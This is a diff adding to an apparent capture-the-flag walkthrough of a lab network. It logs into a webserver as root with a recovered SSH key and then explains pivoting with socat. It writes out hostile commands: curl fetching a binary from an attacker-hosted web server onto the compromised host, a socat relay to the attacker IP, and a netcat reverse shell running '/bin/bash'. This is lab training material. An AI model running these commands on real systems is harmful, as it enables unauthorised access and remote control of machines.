@@ -351,6 +351,14 @@ drwxr-xr-x 4 kali kali 4096 Apr  4 05:30 ..
 -rw------- 1 kali kali 2602 Apr  4 05:30 id_rsa
 ```
 
+Now we can just use this key to ssh straight into the webserver
+
+```
+ssh -i id_rsa root@10.200.81.200
+[root@prod-serv ~]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+```
+
 </details>
 
 ## 4. Pivoting
@@ -626,5 +634,74 @@ Socat:
 - Port forwarding.
 - However, rarely installed on target
 - Unlikely to bypass AV in Windows
+- Makes a good relay
+
+For example: trying to get shell on a target without direct connection. Use socat to set up a relay on the compromised machine. This listens for the reverse shell from target and forwards to attacking box
+
+![socat as a relay](socat.png)
+
+Above we create a port forward from a port on the compromised server to a listening port on our attacker box. The other way is also possible: either forwarding a connection from attacking machine to a target inside network; or creat a direct link between listening port on attacking machine with service on the internal server. The latter is useful as it does not require opening a port to compromised server.
+
+To download binary for socat:
+
+1. Set up python web server on attacking machine (in the directory with socat binary)
+
+```
+sudo python3 -m http.server 80
+```
+
+2. Download on target machine with curl
+
+```
+curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
+```
+
+Example
+
+Attacking machine
+```
+kali@kali:~/thm/wreath$ sudo python3 -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.81.200 - - [05/Apr/2021 00:10:09] "GET /socat HTTP/1.1" 200 -
+```
+
+Compromised webserver
+```
+root@prod-serv tmp]# curl 10.50.82.56/socat -o /tmp/socat-Neozer0 && chmod +x /tmp/socat-Neozer0
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  369k  100  369k    0     0   224k      0  0:00:01  0:00:01 --:--:--  224k
+
+[root@prod-serv tmp]# ls -la socat-N*
+-rwxr-xr-x. 1 root root 378384 Apr  5 05:08 socat-Neozer0
+
+```
+
+### Reverse shell relay
+
+Start a listener in attacking machine
+```
+sudo nc -lvnp 1990
+```
+
+run socat on compromised webserver
+```
+[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:8000 tcp:10.50.82.56:1990 &
+[1] 2136
+
+
+
+```
+
+Create reverse shell on newly opened port 8000
+
+```
+chmod +x ./nc-Neozer0
+
+./nc-Neozer0 127.0.0.1 8000 -e /bin/bash
+
+
+```
 
 </details>
